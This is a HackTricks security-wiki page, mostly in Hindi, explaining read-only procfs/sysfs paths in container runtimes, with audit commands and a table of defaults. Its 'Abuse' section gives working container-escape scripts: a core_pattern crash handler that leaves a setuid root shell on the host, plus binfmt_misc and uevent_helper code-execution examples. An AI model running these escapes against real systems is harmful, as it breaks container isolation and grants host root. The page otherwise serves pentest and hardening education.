# पठनीय सिस्टम पाथ

{{#include ../../../../banners/hacktricks-training.md}}

रीड-ओनली सिस्टम पाथ masked paths से अलग एक सुरक्षा हैं। किसी पाथ को पूरी तरह छुपाने के बजाय, runtime उसे expose करता है पर उसे read-only रूप में mount करता है। यह चुनिंदा procfs और sysfs लोकेशन्स के लिए सामान्य है, जहाँ पढ़ने की पहुँच स्वीकार्य या ऑपरेशनल रूप से आवश्यक हो सकती है, पर लिखना बहुत खतरनाक होगा।

उद्देश्य सरल है: कई kernel इंटरफेस writable होने पर बहुत अधिक खतरनाक हो जाते हैं। एक read-only mount सभी reconnaissance मूल्य को नहीं हटाता, पर यह compromised workload को उस पाथ के माध्यम से underlying kernel-facing फाइलों को संशोधित करने से रोकता।

## ऑपरेशन

runtimes अक्सर proc/sys व्यू के कुछ हिस्सों को read-only के रूप में मार्क करते हैं। runtime और host के अनुसार, इसमें निम्नलिखित पाथ शामिल हो सकते हैं:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

वास्तविक सूची भिन्न हो सकती है, पर मॉडल एक जैसा है: जहाँ आवश्यकता हो वहां दृश्यता की अनुमति दें, पर परिवर्तनों को डिफ़ॉल्ट रूप से अस्वीकार करें।

## लैब

Docker द्वारा घोषित read-only पाथ सूची की जाँच करें:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
container के अंदर से mounted proc/sys view का निरीक्षण करें:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

रीड-ओनली सिस्टम पाथ्स होस्ट-प्रभावित दुरुपयोग के एक बड़े वर्ग को सीमित करते हैं। यहाँ तक कि जब एक हमलावर procfs या sysfs का निरीक्षण कर सकता है, वहां लिख न पाने से kernel tunables, crash handlers, module-loading helpers, या अन्य control interfaces से जुड़े कई सीधे संशोधन मार्ग हट जाते हैं। एक्सपोज़र पूरी तरह गायब नहीं होता, लेकिन information disclosure से host influence तक का संक्रमण कठिन हो जाता है।

## Misconfigurations

मुख्य गलतियाँ हैं संवेदनशील paths को unmask या remount कर के read-write बनाना, writable bind mounts के साथ host proc/sys कंटेंट को सीधे एक्सपोज़ करना, या ऐसे privileged modes का उपयोग करना जो सुरक्षित runtime डिफ़ॉल्ट्स को प्रभावी रूप से बाईपास कर देते हैं। Kubernetes में, `procMount: Unmasked` और privileged workloads अक्सर कमजोर proc सुरक्षा के साथ एक साथ चलते हैं। एक और सामान्य ऑपरेशनल गलती यह मान लेना है कि चूँकि runtime सामान्यतः इन पाथ्स को read-only के रूप में माउंट करता है, इसलिए सभी workloads अभी भी उस डिफ़ॉल्ट को इनहेरिट कर रहे हैं।

## Abuse

यदि सुरक्षा कमजोर है, तो writable proc/sys एंट्रीज़ की तलाश करके शुरू करें:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
जब writable entries मौजूद हों, उच्च‑मूल्य के फलो‑अप पथ इनमें शामिल हैं:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Writable entries under `/proc/sys` often mean the container can modify host kernel behavior rather than merely inspect it.
- `core_pattern` is especially important because a writable host-facing value can be turned into a host code-execution path by crashing a process after setting a pipe handler.
- `modprobe` reveals the helper used by the kernel for module-loading related flows; it is a classic high-value target when writable.
- `binfmt_misc` tells you whether custom interpreter registration is possible. If registration is writable, this can become an execution primitive instead of just an information leak.
- `panic_on_oom` controls a host-wide kernel decision and can therefore turn resource exhaustion into host denial of service.
- `uevent_helper` is one of the clearest examples of a writable sysfs helper path producing host-context execution.

Interesting findings include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the workload has moved from a constrained container view toward meaningful kernel influence.

### पूर्ण उदाहरण: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
यदि वह path वास्तव में host kernel तक पहुँचता है, तो payload host पर चलकर पीछे एक setuid shell छोड़ देता है।

### पूर्ण उदाहरण: `binfmt_misc` पंजीकरण

यदि `/proc/sys/fs/binfmt_misc/register` लिखने योग्य है, तो एक custom interpreter पंजीकरण matching file के execute होने पर code execution उत्पन्न कर सकता है:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
होस्ट-फेसिंग writable `binfmt_misc` पर, kernel-triggered interpreter path में कोड निष्पादन हो सकता है।

### पूर्ण उदाहरण: `uevent_helper`

यदि `/sys/kernel/uevent_helper` writable है, तो kernel किसी matching event के trigger होने पर host-path helper को बुला सकता है:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
यह इतना खतरनाक इसलिए है कि helper path को host filesystem के दृष्टिकोण से resolve किया जाता है, न कि किसी सुरक्षित container-only context से।

## जांच

ये जाँचें निर्धारित करती हैं कि procfs/sysfs exposure अपेक्षित स्थानों पर read-only है या नहीं, और क्या workload अभी भी sensitive kernel interfaces को modify कर सकता है।
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
What is interesting here:

- एक सामान्य कठोर-सुरक्षा वाला वर्कलोड बहुत कम writable /proc/sys एंट्रीज़ ही एक्सपोज़ करे।
- Writable `/proc/sys` paths अक्सर सामान्य read access से अधिक महत्वपूर्ण होते हैं।
- यदि runtime कहता है कि कोई path read-only है लेकिन व्यवहार में वह writable है, तो mount propagation, bind mounts, और privilege settings को ध्यान से जांचें।

## रनटाइम डिफ़ॉल्ट

| Runtime / platform | डिफ़ॉल्ट स्थिति | डिफ़ॉल्ट व्यवहार | सामान्य मैन्युअल कमजोरियाँ |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से सक्षम | Docker संवेदनशील proc एंट्रीज़ के लिए एक डिफ़ॉल्ट read-only path सूची परिभाषित करता है | होस्ट /proc/sys माउंट्स को एक्सपोज़ करना, `--privileged` |
| Podman | डिफ़ॉल्ट रूप से सक्षम | Podman स्पष्ट रूप से ढीला न करने पर डिफ़ॉल्ट read-only paths लागू करता है | `--security-opt unmask=ALL`, व्यापक होस्ट माउंट्स, `--privileged` |
| Kubernetes | रनटाइम डिफ़ॉल्ट्स को विरासत में लेता है | Pod सेटिंग्स या होस्ट माउंट्स द्वारा कमजोर न होने पर अंतर्निहित runtime के read-only path मॉडल का उपयोग करता है | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | रनटाइम डिफ़ॉल्ट | आम तौर पर OCI/runtime डिफ़ॉल्ट्स पर निर्भर | Kubernetes पंक्ति के समान; सीधे runtime config परिवर्तनों से व्यवहार कमजोर हो सकता है |

मुख्य बिंदु यह है कि read-only सिस्टम paths आम तौर पर runtime डिफ़ॉल्ट के रूप में मौजूद होते हैं, लेकिन इन्हें privileged modes या host bind mounts से आसानी से कमजोर किया जा सकता है।
